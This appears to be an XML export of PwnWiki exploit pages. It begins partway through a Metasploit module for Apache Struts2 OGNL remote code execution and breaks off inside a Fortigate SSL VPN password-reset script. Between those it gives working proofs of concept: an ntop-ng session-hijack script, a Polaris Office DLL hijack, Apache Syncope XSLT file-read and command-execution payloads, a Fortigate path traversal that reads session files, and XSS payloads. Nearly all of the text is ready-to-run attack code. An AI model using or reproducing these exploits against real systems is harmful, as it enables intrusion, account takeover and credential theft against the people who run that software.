            'Arch'           =&gt; [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
            'DefaultOptions' =&gt; {'PAYLOAD' =&gt; 'cmd/unix/generic'}
          },
        ],
      ],
      'DisclosureDate' =&gt; 'Aug 22 2018', # Private disclosure = Apr 10 2018
      'DefaultTarget'  =&gt; 0))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new('TARGETURI', [ true, 'A valid base path to a struts application', '/' ]),
          OptString.new('ACTION', [ true, 'A valid endpoint that is configured as a redirect action', 'showcase.action' ]),
          OptString.new('ENABLE_STATIC', [ true, 'Enable "allowStaticMethodAccess" before executing OGNL', true ]),
        ]
      )
      register_advanced_options(
        [
          OptString.new('HTTPMethod', [ true, 'The HTTP method to send in the request. Cannot contain spaces', 'GET' ]),
          OptString.new('HEADER', [ true, 'The HTTP header field used to transport the optional payload', "X-#{rand_text_alpha(4)}"] ),
          OptString.new('TEMPFILE', [ true, 'The temporary filename written to disk when executing a payload', "#{rand_text_alpha(8)}"] ),
        ]
      )
  end

  def check
    # METHOD 1: Try to extract the state of hte allowStaticMethodAccess variable
    ognl = "#_memberAccess['allowStaticMethodAccess']"

    resp = send_struts_request(ognl)

    # If vulnerable, the server should return an HTTP 302 (Redirect)
    #   and the 'Location' header should contain either 'true' or 'false'
    if resp &amp;&amp; resp.headers['Location']
      output = resp.headers['Location']
      vprint_status("Redirected to:  #{output}")
      if (output.include? '/true/')
        print_status("Target does *not* require enabling 'allowStaticMethodAccess'.  Setting ENABLE_STATIC to 'false'")
        datastore['ENABLE_STATIC'] = false
        CheckCode::Vulnerable
      elsif (output.include? '/false/')
        print_status("Target requires enabling 'allowStaticMethodAccess'.  Setting ENABLE_STATIC to 'true'")
        datastore['ENABLE_STATIC'] = true
        CheckCode::Vulnerable
      else
        CheckCode::Safe
      end
    elsif resp &amp;&amp; resp.code==400
      # METHOD 2: Generate two random numbers, ask the target to add them together.
      #   If it does, it's vulnerable.
      a = rand(10000)
      b = rand(10000)
      c = a+b

      ognl = "#{a}+#{b}"

      resp = send_struts_request(ognl)

      if resp.headers['Location'].include? c.to_s
        vprint_status("Redirected to:  #{resp.headers['Location']}")
        print_status("Target does *not* require enabling 'allowStaticMethodAccess'.  Setting ENABLE_STATIC to 'false'")
        datastore['ENABLE_STATIC'] = false
        CheckCode::Vulnerable
      else
        CheckCode::Safe
      end
    end
  end

  def exploit
    case payload.arch.first
    when ARCH_CMD
      resp = execute_command(payload.encoded)
    else
      resp = send_payload()
    end
  end

  def encode_ognl(ognl)
    # Check and fail if the command contains the follow bad characters:
    #   ';' seems to terminates the OGNL statement
    #   '/' causes the target to return an HTTP/400 error
    #   '\' causes the target to return an HTTP/400 error (sometimes?)
    #   '\r' ends the GET request prematurely
    #   '\n' ends the GET request prematurely

    # TODO: Make sure the following line is uncommented
    bad_chars = %w[; \\ \r \n]    # and maybe '/'
    bad_chars.each do |c|
      if ognl.include? c
        print_error("Bad OGNL request: #{ognl}")
        fail_with(Failure::BadConfig, "OGNL request cannot contain a '#{c}'")
      end
    end

    # The following list of characters *must* be encoded or ORNL will asplode
    encodable_chars = { "%": "%25",       # Always do this one first.  :-)
                        " ": "%20",
                        "\"":"%22",
                        "#": "%23",
                        "'": "%27",
                        "&lt;": "%3c",
                        "&gt;": "%3e",
                        "?": "%3f",
                        "^": "%5e",
                        "`": "%60",
                        "{": "%7b",
                        "|": "%7c",
                        "}": "%7d",
                       #"\/":"%2f",       # Don't do this.  Just leave it front-slashes in as normal.
                       #";": "%3b",       # Doesn't work.  Anyone have a cool idea for a workaround?
                       #"\\":"%5c",       # Doesn't work.  Anyone have a cool idea for a workaround?
                       #"\\":"%5c%5c",    # Doesn't work.  Anyone have a cool idea for a workaround?
                      }

    encodable_chars.each do |k,v|
     #ognl.gsub!(k,v)                     # TypeError wrong argument type Symbol (expected Regexp)
      ognl.gsub!("#{k}","#{v}")
    end
    return ognl
  end

  def send_struts_request(ognl, payload: nil)
=begin  #badchar-checking code
    pre = ognl
=end

    ognl = "${#{ognl}}"
    vprint_status("Submitted OGNL: #{ognl}")
    ognl = encode_ognl(ognl)

    headers = {'Keep-Alive': 'timeout=5, max=1000'}

    if payload
      vprint_status("Embedding payload of #{payload.length} bytes")
      headers[datastore['HEADER']] = payload
    end

    # TODO: Embed OGNL in an HTTP header to hide it from the Tomcat logs
    uri = "/#{ognl}/#{datastore['ACTION']}"

    resp = send_request_cgi(
     #'encode'  =&gt; true,     # this fails to encode '\', which is a problem for me
      'uri'     =&gt; uri,
      'method'  =&gt; datastore['HTTPMethod'],
      'headers' =&gt; headers
    )

    if resp &amp;&amp; resp.code == 404
      fail_with(Failure::UnexpectedReply, "Server returned HTTP 404, please double check TARGETURI and ACTION options")
    end

=begin  #badchar-checking code
    print_status("Response code: #{resp.code}")
    #print_status("Response recv: BODY '#{resp.body}'") if resp.body
    if resp.headers['Location']
      print_status("Response recv: LOC: #{resp.headers['Location'].split('/')[1]}")
      if resp.headers['Location'].split('/')[1] == pre[1..-2]
        print_good("GOT 'EM!")
      else
        print_error("                       #{pre[1..-2]}")
      end
    end
=end

    resp
  end

  def profile_target
    # Use OGNL to extract properties from the Java environment

    properties = { 'os.name': nil,          # e.g. 'Linux'
                   'os.arch': nil,          # e.g. 'amd64'
                   'os.version': nil,       # e.g. '4.4.0-112-generic'
                   'user.name': nil,        # e.g. 'root'
                   #'user.home': nil,       # e.g. '/root' (didn't work in testing)
                   'user.language': nil,    # e.g. 'en'
                   #'java.io.tmpdir': nil,  # e.g. '/usr/local/tomcat/temp' (didn't work in testing)
                   }

    ognl = ""
    ognl &lt;&lt; %q|(#_memberAccess['allowStaticMethodAccess']=true).| if datastore['ENABLE_STATIC']
    ognl &lt;&lt; %Q|('#{rand_text_alpha(2)}')|
    properties.each do |k,v|
      ognl &lt;&lt; %Q|+(@java.lang.System@getProperty('#{k}'))+':'|
    end
    ognl = ognl[0...-4]

    r = send_struts_request(ognl)

    if r.code == 400
      fail_with(Failure::UnexpectedReply, "Server returned HTTP 400, consider toggling the ENABLE_STATIC option")
    elsif r.headers['Location']
      # r.headers['Location'] should look like '/bILinux:amd64:4.4.0-112-generic:root:en/help.action'
      #   Extract the OGNL output from the Location path, and strip the two random chars
      s = r.headers['Location'].split('/')[1][2..-1]

      if s.nil?
        # Since the target didn't respond with an HTTP/400, we know the OGNL code executed.
        #   But we didn't get any output, so we can't profile the target.  Abort.
        return nil
      end

      # Confirm that all fields were returned, and non include extra (:) delimiters
      #   If the OGNL fails, we might get a partial result back, in which case, we'll abort.
      if s.count(':') &gt; properties.length
        print_error("Failed to profile target.  Response from server: #{r.to_s}")
        fail_with(Failure::UnexpectedReply, "Target responded with unexpected profiling data")
      end

      # Separate the colon-delimited properties and store in the 'properties' hash
      s = s.split(':')
      i = 0
      properties.each do |k,v|
        properties[k] = s[i]
        i += 1
      end

      print_good("Target profiled successfully: #{properties[:'os.name']} #{properties[:'os.version']}" +
        " #{properties[:'os.arch']}, running as #{properties[:'user.name']}")
      return properties
    else
      print_error("Failed to profile target.  Response from server: #{r.to_s}")
      fail_with(Failure::UnexpectedReply, "Server did not respond properly to profiling attempt.")
    end
  end

  def execute_command(cmd_input, opts={})
    # Semicolons appear to be a bad character in OGNL.  cmdstager doesn't understand that.
    if cmd_input.include? ';'
      print_warning("WARNING: Command contains bad characters: semicolons (;).")
    end

    begin
      properties = profile_target
      os = properties[:'os.name'].downcase
    rescue
      vprint_warning("Target profiling was unable to determine operating system")
      os = ''
      os = 'windows' if datastore['PAYLOAD'].downcase.include? 'win'
      os = 'linux'   if datastore['PAYLOAD'].downcase.include? 'linux'
      os = 'unix'    if datastore['PAYLOAD'].downcase.include? 'unix'
    end

    if (os.include? 'linux') || (os.include? 'nix')
      cmd = "{'sh','-c','#{cmd_input}'}"
    elsif os.include? 'win'
      cmd = "{'cmd.exe','/c','#{cmd_input}'}"
    else
      vprint_error("Failed to detect target OS.  Attempting to execute command directly")
      cmd = cmd_input
    end

    # The following OGNL will run arbitrary commands on Windows and Linux
    #   targets, as well as returning STDOUT and STDERR.  In my testing,
    #   on Struts2 in Tomcat 7.0.79, commands timed out after 18-19 seconds.

    vprint_status("Executing: #{cmd}")

    ognl =  ""
    ognl &lt;&lt; %q|(#_memberAccess['allowStaticMethodAccess']=true).| if datastore['ENABLE_STATIC']
    ognl &lt;&lt; %Q|(#p=new java.lang.ProcessBuilder(#{cmd})).|
    ognl &lt;&lt; %q|(#p.redirectErrorStream(true)).|
    ognl &lt;&lt; %q|(#process=#p.start()).|
    ognl &lt;&lt; %q|(#r=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).|
    ognl &lt;&lt; %q|(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#r)).|
    ognl &lt;&lt; %q|(#r.flush())|

    r = send_struts_request(ognl)

    if r &amp;&amp; r.code == 200
      print_good("Command executed:\n#{r.body}")
    elsif r
      if r.body.length == 0
        print_status("Payload sent, but no output provided from server.")
      elsif r.body.length &gt; 0
        print_error("Failed to run command.  Response from server: #{r.to_s}")
      end
    end
  end

  def send_payload
    # Probe for the target OS and architecture
    begin
      properties = profile_target
      os = properties[:'os.name'].downcase
    rescue
      vprint_warning("Target profiling was unable to determine operating system")
      os = ''
      os = 'windows' if datastore['PAYLOAD'].downcase.include? 'win'
      os = 'linux'   if datastore['PAYLOAD'].downcase.include? 'linux'
      os = 'unix'    if datastore['PAYLOAD'].downcase.include? 'unix'
    end

    data_header = datastore['HEADER']
    if data_header.empty?
      fail_with(Failure::BadConfig, "HEADER parameter cannot be blank when sending a payload")
    end

    random_filename = datastore['TEMPFILE']

    # d = data stream from HTTP header
    # f = path to temp file
    # s = stream/handle to temp file
    ognl  = ""
    ognl &lt;&lt; %q|(#_memberAccess['allowStaticMethodAccess']=true).| if datastore['ENABLE_STATIC']
    ognl &lt;&lt; %Q|(#d=@org.apache.struts2.ServletActionContext@getRequest().getHeader('#{data_header}')).|
    ognl &lt;&lt; %Q|(#f=@java.io.File@createTempFile('#{random_filename}','tmp')).|
    ognl &lt;&lt; %q|(#f.setExecutable(true)).|
    ognl &lt;&lt; %q|(#f.deleteOnExit()).|
    ognl &lt;&lt; %q|(#s=new java.io.FileOutputStream(#f)).|
    ognl &lt;&lt; %q|(#d=new sun.misc.BASE64Decoder().decodeBuffer(#d)).|
    ognl &lt;&lt; %q|(#s.write(#d)).|
    ognl &lt;&lt; %q|(#s.close()).|
    ognl &lt;&lt; %q|(#p=new java.lang.ProcessBuilder({#f.getAbsolutePath()})).|
    ognl &lt;&lt; %q|(#p.start()).|
    ognl &lt;&lt; %q|(#f.delete()).|

    success_string = rand_text_alpha(4)
    ognl &lt;&lt; %Q|('#{success_string}')|

    exe = [generate_payload_exe].pack("m").delete("\n")
    r = send_struts_request(ognl, payload: exe)

    if r &amp;&amp; r.headers &amp;&amp; r.headers['Location'].split('/')[1] == success_string
      print_good("Payload successfully dropped and executed.")
    elsif r &amp;&amp; r.headers['Location']
      vprint_error("RESPONSE: " + r.headers['Location'])
      fail_with(Failure::PayloadFailed, "Target did not successfully execute the request")
    elsif r &amp;&amp; r.code == 400
      fail_with(Failure::UnexpectedReply, "Target reported an unspecified error while executing the payload")
    end
  end
end



&lt;/pre&gt;</text>
      <sha1>stgnj54qjh1ehbyzg4n8f3iv893r7aj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-11784 Apache Tomcat 9.0.0.M1 開放式重定向漏洞</title>
    <ns>0</ns>
    <id>6251</id>
    <revision>
      <id>7171</id>
      <timestamp>2021-07-13T14:19:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Apache Tomcat 9.0.0.M1 to 9.0.0.11, 8.5.0 to 8.5.33, and 7.0.23 to 7.0.90 &lt;/pre&gt;  ==POC== &lt;pre&gt; # Exploit Title:..."</comment>
      <origin>7171</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="694" sha1="brodcii3dc0ibfegcs4cpxrlcz1pok8" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Apache Tomcat 9.0.0.M1 to 9.0.0.11, 8.5.0 to 8.5.33, and 7.0.23 to 7.0.90
&lt;/pre&gt;

==POC==
&lt;pre&gt;
# Exploit Title: Apache Tomcat 9.0.0.M1 - Open Redirect
# Date: 10/04/2018
# Exploit Author: Central InfoSec
# Version: Apache Tomcat 9.0.0.M1 to 9.0.0.11, 8.5.0 to 8.5.33, and 7.0.23 to 7.0.90
# CVE : CVE-2018-11784

# Proof of Concept:

# Identify a subfolder within your application
http://example.com/test/

# Modify the URL to include at least 2 leading slashes before the subfolder and no trailing slash
http://example.com//test

# Browse to the newly created URL and the application will perform a redirection
http://test/
&lt;/pre&gt;</text>
      <sha1>brodcii3dc0ibfegcs4cpxrlcz1pok8</sha1>
    </revision>
    <revision>
      <id>7172</id>
      <parentid>7171</parentid>
      <timestamp>2021-07-13T14:19:45Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>7172</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="705" sha1="89pcp4hw4zqt7afn0ks3xuqes628abn" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Apache Tomcat 9.0.0.M1 to 9.0.0.11, 8.5.0 to 8.5.33, and 7.0.23 to 7.0.90
&lt;/pre&gt;

==POC==
&lt;pre&gt;
# Exploit Title: Apache Tomcat 9.0.0.M1 - Open Redirect
# Date: 10/04/2018
# Exploit Author: Central InfoSec
# Version: Apache Tomcat 9.0.0.M1 to 9.0.0.11, 8.5.0 to 8.5.33, and 7.0.23 to 7.0.90
# CVE : CVE-2018-11784

# Proof of Concept:

# Identify a subfolder within your application
http://example.com/test/

# Modify the URL to include at least 2 leading slashes before the subfolder and no trailing slash
http://example.com//test

# Browse to the newly created URL and the application will perform a redirection
http://test/
&lt;/pre&gt;</text>
      <sha1>89pcp4hw4zqt7afn0ks3xuqes628abn</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-12520 ntop-ng 身份驗證繞過漏洞</title>
    <ns>0</ns>
    <id>1217</id>
    <revision>
      <id>1522</id>
      <timestamp>2021-04-11T01:57:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Vulnerability title: ntop-ng &lt; 3.4.180617 - Authentication Bypass # Author: Ioannis Profetis # Contact: me at x86.re # Vulnerable versions: &lt; 3.4.180617-4560 #..."</comment>
      <origin>1522</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2168" sha1="mlhak6owgzezlv3du3rv2z4ssls4opf" xml:space="preserve">==EXP==
&lt;pre&gt;
# Vulnerability title: ntop-ng &lt; 3.4.180617 - Authentication Bypass
# Author: Ioannis Profetis
# Contact: me at x86.re
# Vulnerable versions: &lt; 3.4.180617-4560
# Fixed version: 3.4.180617
# Link: ntop.org
# Date: 2.07.2018
# CVE-2018-12520

# Product Details
ntopng is the next generation version of the original ntop, a network traffic probe that shows the network usage, similar to what the popular top Unix command does. ntopng is based on libpcap and it has been written in a portable way in order to virtually run on every Unix platform, MacOSX and on Windows as well.

# Vulnerability Details
An issue was discovered in ntopng 3.4. 
The PRNG involved in the generation of session IDs is not seeded at program startup. 
This results in deterministic session IDs being allocated for active user sessions. An attacker with foreknowledge of the operating system and standard library in use by the host running the service and the username of the user whose session they're targeting can abuse the deterministic random number generation in order to hijack the user's session, thus escalating their access.

# Exploit
A proof-of-concept for this vulnerability can be found below. Note that this script has been tested with Python 2.7, and requires the 'requests' module, which can be found in the Python Package Index.

import requests
import sys
import hashlib
from ctypes import *
libc = CDLL('libc.so.6')

if __name__ == "__main__":
    if len(sys.argv) &lt; 3:
        print('[-] Usage: python poc.py &lt;host&gt; &lt;username&gt;')
        sys.exit(1)

    host, username = sys.argv[1:]
    for i in range(256):
        print('[*] Trying with rand() iteration %d...' % i)
        session = hashlib.md5(('%d' % libc.rand()) + username).hexdigest()
        r = requests.get(host + '/lua/network_load.lua', cookies={'user': username, 'session': session})
        if r.status_code == 200:
            print('[+] Got it! Valid session cookie is %s for username %s.' % (session, username))
            break

# Mitigation
Upgrade to the latest stable version of ntop-ng 3.4.

# Attack Type
Remote, Unauthenticated, Escalation of Privileges, Information Disclosure
&lt;/pre&gt;</text>
      <sha1>mlhak6owgzezlv3du3rv2z4ssls4opf</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-12589 Polaris Office 2017 8.1 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1218</id>
    <revision>
      <id>1523</id>
      <timestamp>2021-04-11T01:59:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; [+] Credits: John Page (aka hyp3rlinx)		 [+] Website: hyp3rlinx.altervista.org [+] Source:  http://hyp3rlinx.altervista.org/advisories/POLARISOFFICE-2017-v8-REM..."</comment>
      <origin>1523</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3129" sha1="j4iw622lk7q4t5olu8ub4ocnk7roro6" xml:space="preserve">==INFO==
&lt;pre&gt;
[+] Credits: John Page (aka hyp3rlinx)		
[+] Website: hyp3rlinx.altervista.org
[+] Source:  http://hyp3rlinx.altervista.org/advisories/POLARISOFFICE-2017-v8-REMOTE-CODE-EXECUTION.txt
[+] ISR: Apparition Security          
 

Vendor:
=============
www.polarisoffice.com


Product:
===========
PolarisOffice 2017 v8

Polaris Document Solution is an integrated solution for corporate document life cycle from document creation, use, management, security, and collaboration.

Used by more than 70 million subscribers in 240 countries.


Vulnerability Type:
===================
Remote Code Execution


CVE Reference:
==============
CVE-2018-12589


Security Issue:
================
Polaris Office 2017 8.1 allows attackers to execute arbitrary code via a Trojan horse "puiframeworkproresenu.dll" file
in the current working directory, due to a search order flaw vulnerability.

1) create a 32bit DLL named "puiframeworkproresenu.dll" 
2) put any .PDF or .PPTX file or whatever that is configured to open in Polaris Office in same directory as the above DLL 
3) open the document (PDF etc) then BOOM our arbitrary DLL will execute on victims system.

This can be observed as well with both the DLL and a document opened from a remote share.



Exploit/POC:
=============

#include &lt;windows.h&gt;

/* hyp3rlinx */

/*
gcc -c -m32 puiframeworkproresenu.c
gcc -shared -m32 -o puiframeworkproresenu.dll puiframeworkproresenu.o
*/

void trojanizer(){
	 MessageBox( 0, "Continue with PWNAGE?" , "philbin :)" , MB_YESNO + MB_ICONQUESTION );
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){
	switch(fdwReason){
		case DLL_PROCESS_ATTACH:{
			 trojanizer();
			break;
		}
		case DLL_PROCESS_DETACH:{
			 trojanizer();
			break;
		}
		case DLL_THREAD_ATTACH:{
			 trojanizer();
			break;
		}
		case DLL_THREAD_DETACH:{
			 trojanizer();
			break;
		}
	}
	
	return TRUE;
}




Network Access:
===============
Remote



Severity:
=========
High



Disclosure Timeline:
=============================
Vendor Notification: June 14, 2018
Vendor confirms vulnerability : June 19, 2018
Mitre assigned CVE : June 20, 2018
Vendor replied fix will be in July
however, update was released : June 23, 2018
Notified vendor of impending advisory : June 23, 2018
Vendor : "glad to hear that your problem has been solved"
June 26, 2018 : Public Disclosure



[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).

hyp3rlinx

&lt;/pre&gt;</text>
      <sha1>j4iw622lk7q4t5olu8ub4ocnk7roro6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-1332 Apache Syncope 2.0.7 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>476</id>
    <revision>
      <id>678</id>
      <timestamp>2021-03-27T02:44:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Apache Syncope 2.0.7 - Remote Code Execution # Date: 2018-09-12 # Exploit Author: Che-Chun Kuo # Vendor Homepage: https://syncope.apache.org/ #..."</comment>
      <origin>678</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4057" sha1="qjhzrg3wrnv0uv3uudkteywd8ngctpd" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Apache Syncope 2.0.7 - Remote Code Execution
# Date: 2018-09-12
# Exploit Author: Che-Chun Kuo
# Vendor Homepage: https://syncope.apache.org/
# Software Link: http://archive.apache.org/dist/syncope/
# Version: 2.0.7
# Tested on: Windows
# Advisory: https://syncope.apache.org/security
# CVE: CVE-2018-1321, CVE-2018-1322
 
# Vulnerability 1: Remote code execution by users with report and template privileges
# Description: A user with access to the Reports and Templates functionality can use XSL Transformations (XSLT) 
# to perform malicious operations, including but not limited to file read, file write, and code execution. 
 
# Apache Syncope uses XSLT to export report data into various formats. An attacker can perform malicious 
# operations by crafting a XSL template, binding the template to a report, executing, then exporting the report. 
# The following XSL can be used to read the Syncope security.properties file or execute the Windows 
# calc program, respectively.  
 
READ security.properties file
-------------------------------------------
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE xsl:stylesheet [&lt;!ENTITY file SYSTEM "..\webapps\syncope\WEB-INF\classes\security.properties"&gt;]&gt;
&lt;xsl:stylesheet version="1.0" 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
    &lt;xsl:template match="/"&gt;&amp;file;&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
 
EXECUTE Windows calc program
-------------------------------------------
&lt;xsl:stylesheet version="1.0" 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:runtime="http://xml.apache.org/xalan/java/java.lang.Runtime"
    xmlns:process="http://xml.apache.org/xalan/java/java.lang.Process"&gt;
    &lt;xsl:variable name="rtobject" select="runtime:getRuntime()"/&gt;
    &lt;xsl:variable name="process" select="runtime:exec($rtobject,'calc')"/&gt;
    &lt;xsl:variable name="waiting" select="process:waitFor($process)"/&gt;
    &lt;xsl:value-of select="$process"/&gt;
&lt;/xsl:stylesheet&gt;
     
# Vulnerability 2: Information disclosure via FIQL and ORDER BY sorting
# Description: A user with entitlements to the /syncope/rest/users endpoint can recover sensitive 
# security values using the fiql and orderby parameters. 
 
# By default, Apache Syncope prevents sensitive values from being returned when querying 
# the /syncope/rest/users endpoint. Fields such as securityAnswers or password will always return null. 
# However the results returned can be filtered or sorted based on sensitive fields. By measuring how 
# the results are returned the values of the desired fields can be successfully recovered. The fiql parameter 
# can be used to recover full security answers, and the orderby parameter can be used to recover 
# full security answers and partial information about password hashes. 
 
# The fiql parameter allows filtering based on user attributes, including a user's security answer. 
# By using FIQL filters (i.e. "securityAnswer==a*", "securityAnswer==b*", etc...) a user's 
# securityAnswer can be recovered one letter at a time. 
 
# The orderby parameter allows sorting based on user attributes, including a user's security 
# answer and password. The following example shows how orderby sorting can be exploited. 
 
# User Bob exists with the security answer "test". A malicious user creates a user Alice with the 
# security answer "ta". The malicious actor then calls the /syncope/rest/users endpoint with orderby=securityAnswer".
# By sorting using the "securityAnswer" attribute, the result will have Alice sorted ahead of Bob, 
# due to the value "ta" being before the value "test". By sequentially changing Alice's security 
# question and comparing the sorted result, Bob's security answer can be recovered one letter 
# at a time. A similar technique can be used to reveal partial information about user password hashes.
 
Orderby Example Results: 
Alice's security answer, Order of results returned
ta, [Alice, Bob]
tb, [Alice, Bob]
tc, [Alice, Bob]
td, [Alice, Bob]
te, [Alice, Bob]
tf, [Bob, Alice]
tea, [Alice, Bob]
teb, [Alice, Bob]

&lt;/pre&gt;</text>
      <sha1>qjhzrg3wrnv0uv3uudkteywd8ngctpd</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-13379 Fortigate SSL VPN 任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>1498</id>
    <revision>
      <id>1880</id>
      <timestamp>2021-04-23T01:00:02Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「==漏洞影響== Fortinet FortiOS 5.6.3版本至5.6.7版本、Fortinet FortiOS 6.0.0版本至6.0.4版本中的SSL VPN 受此漏洞影響。  ==POC== &lt;pre&gt; /remote…」的新頁面</comment>
      <origin>1880</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="232" sha1="3wgg7w94riua252vtsaj4loigyjf17j" xml:space="preserve">==漏洞影響==
Fortinet FortiOS 5.6.3版本至5.6.7版本、Fortinet FortiOS 6.0.0版本至6.0.4版本中的SSL VPN 受此漏洞影響。

==POC==
&lt;pre&gt;
/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
&lt;/pre&gt;</text>
      <sha1>3wgg7w94riua252vtsaj4loigyjf17j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-13380 Fortigate SSL VPN XSS漏洞</title>
    <ns>0</ns>
    <id>1499</id>
    <revision>
      <id>1881</id>
      <timestamp>2021-04-23T01:02:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「==漏洞影響== Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.8  ==XSS== &lt;pre&gt; /remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%…」的新頁面</comment>
      <origin>1881</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="313" sha1="qe8copm40vezu96kwljt9pnlmrs3ahy" xml:space="preserve">==漏洞影響==
Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.8

==XSS==
&lt;pre&gt;
/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert(1)%3C/script%3E
/remote/loginredir?redir=6a6176617363726970743a616c65727428646f63756d656e742e646f6d61696e29
/message?title=x&amp;msg=%26%23&lt;svg/onload=alert(1)&gt;;
&lt;/pre&gt;</text>
      <sha1>qe8copm40vezu96kwljt9pnlmrs3ahy</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-13382 Fortigate SSL VPN 後門</title>
    <ns>0</ns>
    <id>1500</id>
    <revision>
      <id>1882</id>
      <timestamp>2021-04-23T01:02:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「==後門影響== Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.9 Fortinet Fortios 5.4.11  ==POC== &lt;pre&gt; import requests, binascii, optparse, sy…」的新頁面</comment>
      <origin>1882</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4445" sha1="ffkwkg92d2wliyg9vlo9uzayax994ga" xml:space="preserve">==後門影響==
Fortinet Fortios 6.2 Fortinet Fortios 6.0.5 Fortinet Fortios 5.6.9 Fortinet Fortios 5.4.11

==POC==
&lt;pre&gt;
import requests, binascii, optparse, sys
from urlparse import urlparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
import multiprocessing
import colored
from user_agent import generate_user_agent, generate_navigator
bold=True
userAgent=generate_user_agent()
username=""
newpassword=""
ip=""
def setColor(message, bold=False, color=None, onColor=None):
    from termcolor import colored, cprint
    retVal = colored(message, color=color, on_color=onColor, attrs=("bold",))
    return retVal
def checkIP(ip):
    try:
        url = "https://"+ip+"/remote/login?lang=en"
        headers = {"User-Agent": userAgent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        r=requests.get(url, headers=headers, verify=False)
        if r.status_code==200 and "&lt;title&gt;Please Login&lt;/title&gt;" in r.text:
            return True
        else:
            return False
    except requests.exceptions.ConnectionError as e:
        print e
        return False
def changePassword(ip,username,newpassword):
    url = "https://"+ip+"/remote/logincheck"
    headers = {"User-Agent": userAgent, "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://"+ip+"/remote/login?lang=en", "Pragma": "no-cache", "Cache-Control": "no-store, no-cache, must-revalidate", "If-Modified-Since": "Sat, 1 Jan 2000 00:00:00 GMT", "Content-Type": "text/plain;charset=UTF-8", "Connection": "close"}
    data = {"ajax": "1", "username": username, "realm": '', "credential": newpassword, "magic": "4tinet2095866", "reqid": "0", "credential2": newpassword}
    r=requests.post(url, headers=headers, data=data, verify=False)
    if r.status_code==200 and 'redir=/remote/hostcheck_install' in r.text:
        return True
    else:
        return False
def testLogin(ip,username,newpassword):
    url = "https://"+ip+"/remote/logincheck"
